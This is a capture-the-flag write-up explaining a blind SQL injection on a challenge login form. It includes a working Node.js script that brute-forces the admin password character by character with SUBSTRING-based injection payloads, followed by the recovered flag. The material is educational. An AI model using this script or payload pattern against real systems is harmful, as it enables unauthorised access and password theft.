---
ai_date: '2025-04-27 05:10:26'
ai_summary: Script bruteforces password by checking characters one at a time using
  SQL substring.
ai_tags:
- sql
- brute-force
- sub-string
created: 2021-12-21T23:50
updated: 2024-06-10T23:38
---

## AppVenture Login Part 2

> Ok, you got the flag, but I bet you'll never get my password!

Basing off the description, the flag is probably the password. Even though we logged in as admin in the last challenge, we do not know of the password.

To get the password, we can check the password 1 character at a time to reduce the number of tries. Trying the entire password string at a time require exponential amount of tries and will be unrealistic.

The flag format is `flag{...}` where characters consist of lower case letters, `{}` and `_`. We can quickly code up a little script to find the password. In this writeup we will be using `node.js` for the simplicity and non-pythonic syntax.

```js
const fetch = require("node-fetch");
const FormData = require('form-data');

let chars = "abcdefghijklmnopqrstuvwxyz_{}".split('');
let password = [];

async function verify(i, c) {
    const form = new FormData();
    form.append('username', `admin' and SUBSTRING(password, ${i + 1}, 1)='${c}' --`);
    const res = await fetch('http://35.240.143.82:4208/login', {method: 'POST', body: form})
    const text = await res.text();
    return text !== "Login failed"
}

async function step(i) {
    for (let c of chars) {
        if (await verify(i, c)) return c;
    }
    return null;
}

async function brute_force() {
    let i = 0;
    while (true) {
        password[i] = await step(i);
        console.log(password.join(''));
        if (!password[i]) break;
        i++;
    }
    console.log(password.join(''));
}

brute_force();
```

As before we use `admin'` to escape the admin field, and `--` to skip the password check.

However we add our own check in the middle, `SUBSTRING(password, i, 1)` works the same as normal substring would but sql is 1-indexed(kinda weird but yeh)

What would happen would be like this

- `select id from users where name='admin' and SUBSTRING(password, 1, 1)='a' --` fail
- `select id from users where name='admin' and SUBSTRING(password, 1, 1)='b' --` fail
- ...
- `select id from users where name='admin' and SUBSTRING(password, 1, 1)='f' --` success
- `select id from users where name='admin' and SUBSTRING(password, 2, 1)='a' --` fail
- ...

`verify` will make a request to check if the password has character in variable `c` at position `i`.

`step` will simply try all characters for a position until one hits.

`brute_force()` will step through all positions until a correct character can't be found for the position, which would be most likely the end of the password

### Running the script

```flag
f
fl
fla
...
flag{oops_looks_like_youre_not_blind
flag{oops_looks_like_youre_not_blind}
flag{oops_looks_like_youre_not_blind}
flag{oops_looks_like_youre_not_blind}
```

Flag obtained